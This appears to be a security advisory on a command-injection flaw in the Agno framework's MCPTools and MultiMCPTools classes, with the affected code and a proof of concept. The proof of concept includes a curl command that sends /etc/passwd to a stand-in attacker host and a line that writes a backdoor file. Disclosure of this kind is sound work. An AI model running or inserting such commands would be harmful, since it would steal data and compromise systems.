# Command Injection Vulnerability in Agno MCP Integration

## Summary

A critical Remote Code Execution (RCE) vulnerability exists in the Agno framework's MCP (Model Context Protocol) integration. The vulnerability allows arbitrary command execution through insufficient input validation in the `MCPTools` and `MultiMCPTools` classes. When user-controlled input is passed to the `command` parameter, it is directly processed by `shlex.split()` and passed to `StdioServerParameters` without any sanitization or validation, enabling attackers to execute arbitrary system commands with the privileges of the Agno agent process.

---

## Description

The vulnerability stems from the unsafe handling of user-controlled command strings in the Agno framework's MCP integration. The affected code paths are:

1. **MCPTools class** (`libs/agno/agno/tools/mcp.py` lines 140-148): User input passed to the `command` parameter is split using `shlex.split()` and directly used to construct `StdioServerParameters`
2. **MultiMCPTools class** (`libs/agno/agno/tools/mcp.py` lines 345-354): Similar vulnerability exists when processing multiple commands in the `commands` parameter

The vulnerability occurs because:
- No input validation or sanitization is performed on the command string
- The `shlex.split()` function only performs shell-style parsing but does not prevent command injection
- The resulting command and arguments are passed directly to the underlying MCP stdio client, which executes them as system commands
- User input can contain shell metacharacters, command separators, and arbitrary commands

---

## Affected Code

**Primary Vulnerability Location 1:**
```python
# libs/agno/agno/tools/mcp.py lines 140-148
if command is not None and transport not in ["sse", "streamable-http"]:
    from shlex import split

    parts = split(command)  # ← Vulnerable: No validation of command content
    if not parts:
        raise ValueError("Empty command string")
    cmd = parts[0]
    arguments = parts[1:] if len(parts) > 1 else []
    self.server_params = StdioServerParameters(command=cmd, args=arguments, env=env)
```

**Primary Vulnerability Location 2:**
```python
# libs/agno/agno/tools/mcp.py lines 345-354
if commands is not None:
    from shlex import split

    for command in commands:
        parts = split(command)  # ← Vulnerable: No validation of command content
        if not parts:
            raise ValueError("Empty command string")
        cmd = parts[0]
        arguments = parts[1:] if len(parts) > 1 else []
        self.server_params_list.append(StdioServerParameters(command=cmd, args=arguments, env=env))
```

---

## Proof of Concept

The vulnerability can be exploited through various entry points in the Agno framework where user input controls MCP server commands. A proof-of-concept demonstration shows how malicious commands can be injected through the command parameter.

**Attack Vector 1: Direct MCPTools instantiation**
```python
# Malicious command injection through MCPTools
malicious_command = "python3 -c 'import os; os.system(\"touch /tmp/pwned.txt\")'"
async with MCPTools(command=malicious_command) as tools:
    # The malicious command gets executed during MCP server initialization
    pass
```

**Attack Vector 2: MultiMCPTools with multiple malicious commands**
```python
# Multiple command injection through MultiMCPTools
malicious_commands = [
    "python3 -c 'import subprocess; subprocess.run([\"curl\", \"http://attacker.com/exfil\", \"-d\", \"@/etc/passwd\"])'",
    "bash -c 'echo \"backdoor\" > /tmp/backdoor.txt'"
]
async with MultiMCPTools(commands=malicious_commands) as tools:
    # All malicious commands get executed
    pass
```

---

## Impact

This vulnerability enables complete system compromise through:

1. **Arbitrary Command Execution**: Attackers can execute any system command with the privileges of the Agno process
2. **Data Exfiltration**: Sensitive files and environment variables can be stolen
3. **System Persistence**: Backdoors and persistent access mechanisms can be installed
4. **Lateral Movement**: The compromised system can be used to attack other systems in the network
5. **AI Agent Manipulation**: Malicious MCP servers can be deployed to manipulate AI agent behavior

**Real-world Attack Scenarios:**
- **Enterprise AI Deployments**: Malicious users can compromise AI agent infrastructure
- **Cloud AI Services**: Multi-tenant environments can be breached through command injection
- **Development Environments**: Developers using Agno can have their systems compromised
- **CI/CD Pipelines**: Automated systems using Agno can be exploited to compromise build infrastructure

---

## Occurrences

The following locations in the Agno repository contain vulnerable code patterns:

- [MCPTools.__init__ method - Line 140-148](https://github.com/agno-agi/agno/blob/cebb4bfe3/libs/agno/agno/tools/mcp.py#L140-L148)
- [MultiMCPTools.__init__ method - Line 345-354](https://github.com/agno-agi/agno/blob/cebb4bfe3/libs/agno/agno/tools/mcp.py#L345-L354)

**Additional Risk Locations:**
- [Example usage in cookbook/examples/agents/airbnb_mcp.py - Line 21](https://github.com/agno-agi/agno/blob/cebb4bfe3/cookbook/examples/agents/airbnb_mcp.py#L21)
- [Example usage in cookbook/tools/mcp/include_exclude_tools.py - Line 27-31](https://github.com/agno-agi/agno/blob/cebb4bfe3/cookbook/tools/mcp/include_exclude_tools.py#L27-L31)
- [Example usage in cookbook/examples/streamlit_apps/github_mcp_agent/agents.py - Line 15-18](https://github.com/agno-agi/agno/blob/cebb4bfe3/cookbook/examples/streamlit_apps/github_mcp_agent/agents.py#L15-L18)
